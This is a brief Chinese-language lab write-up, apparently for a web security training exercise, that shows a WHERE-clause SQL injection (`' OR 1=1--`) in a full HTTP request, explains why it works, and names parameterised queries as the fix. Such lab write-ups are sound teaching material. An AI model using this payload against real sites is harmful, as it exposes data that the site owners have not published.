# SQLi · WHERE 子句

日期：2026-10-21　标签：SQLi、WHERE子句

## 1. 题目要求

让页面展示所有商品，包括未发布商品。

## 2. payload

```
GET /filter?category=Corporate+gifts'+OR+1=1-- HTTP/2
Host: 0ae900580482ea3b81e91b0800cb00a6.web-security-academy.net
Cookie: session=mJ09ILZXq3gDQMlPG3wtkVSfllp7x1qm
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/152.0.0.0 Safari/537.36 Edg/152.0.0.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
```

关键 payload：

```
GET /filter?category=Corporate+gifts'+OR+1=1-- HTTP/2
```

## 3. 为什么有效

原始 SQL：

```sql
SELECT * FROM products WHERE category='Corporate gifts' AND released=1
```

注入后：

```sql
SELECT * FROM products WHERE category='Corporate gifts' OR 1=1--' AND released=1
```

- `--` 为注释符，将 `--` 后的代码注释掉
- `OR` 表判断，只需一个为真即可
- `+` 表空格
- `1=1` 恒为真，则可以展示所有商品

若用：

```sql
SELECT * FROM products WHERE category='Corporate gifts'--' AND released=1
```

则只能展示 Corporate gifts 类的所有商品。

## 4. 怎么防

成因：单引号没被当作数据，而被当作代码。

方向：参数化查询，让输入永远是数据，不能改变语句结构。
